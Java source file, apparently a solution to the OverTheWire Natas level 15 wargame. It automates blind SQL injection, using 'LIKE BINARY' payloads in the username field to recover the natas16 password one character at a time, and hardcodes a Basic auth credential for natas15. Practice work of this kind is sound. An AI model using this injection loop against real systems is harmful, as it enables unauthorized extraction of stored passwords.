package sqlInjection;

import responseReader.HttpURLConnectionResponseReader;
import responseReader.NatasHttpUrlConnectionResponseReader;
import sqlInjection.utils.SqlInjectionUtils;
import util.XwwwFormUrlEncoder;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

public class NatasSqlInjectionPasswordGuesser extends AbstractSqlInjectionPasswordGuesser {

    private static final String USER_EXISTS = "This user exists.";
    private static final HttpURLConnectionResponseReader RESPONSE_READER =
            new NatasHttpUrlConnectionResponseReader(807);

    public NatasSqlInjectionPasswordGuesser(int passwordLength,
                                            OutputStream progressOutputStream) {
        super(passwordLength, progressOutputStream);
    }

    @Override
    protected String getBodyForFilteringUsefulCharacters(Character passwordCharacter) {
        Map<String, String> formData = new HashMap<>();
        formData.put("username", String.format("natas16\" AND password LIKE BINARY \"%%%s%%\";-- ", passwordCharacter));
        return XwwwFormUrlEncoder.getDataString(formData);
    }

    @Override
    protected String getBodyForPasswordGuessing(String passwordBeginning) {
        Map<String, String> formData = new HashMap<>();
        formData.put("username", String.format("natas16\" AND password LIKE BINARY \"%s%%\";-- ", passwordBeginning));
        return XwwwFormUrlEncoder.getDataString(formData);
    }

    @Override
    protected boolean isGuessSuccessful(String body) throws Throwable {
        HttpURLConnection connection = getUrlConnection(body);
        String response = RESPONSE_READER.read(connection);
        connection.disconnect();
        return response.equals(USER_EXISTS);
    }

    @Override
    protected List<Character> getAllowedCharacters() {
        return SqlInjectionUtils.getDigitsAndLetters();
    }

    private HttpURLConnection getUrlConnection(String body) throws Throwable {
        URL url = new URL("http://natas15.natas.labs.overthewire.org/");
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod("POST");
        urlConnection.addRequestProperty("Cache-Control", "max-age=0");
        urlConnection.addRequestProperty("Authorization", "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==");
        urlConnection.addRequestProperty("Upgrade-Insecure-Requests", "1");
        urlConnection.addRequestProperty("Origin", "http://natas15.natas.labs.overthewire.org");
        urlConnection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        urlConnection.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
        urlConnection.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        urlConnection.addRequestProperty("Referer", "http://natas15.natas.labs.overthewire.org/");
        urlConnection.addRequestProperty("Accept-Encoding", "gzip, deflate");
        urlConnection.addRequestProperty("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7");
        urlConnection.setDoOutput(true);
        try (OutputStream stream = urlConnection.getOutputStream()) {
            stream.write(body.getBytes(StandardCharsets.UTF_8));
        }
        return urlConnection;
    }
}
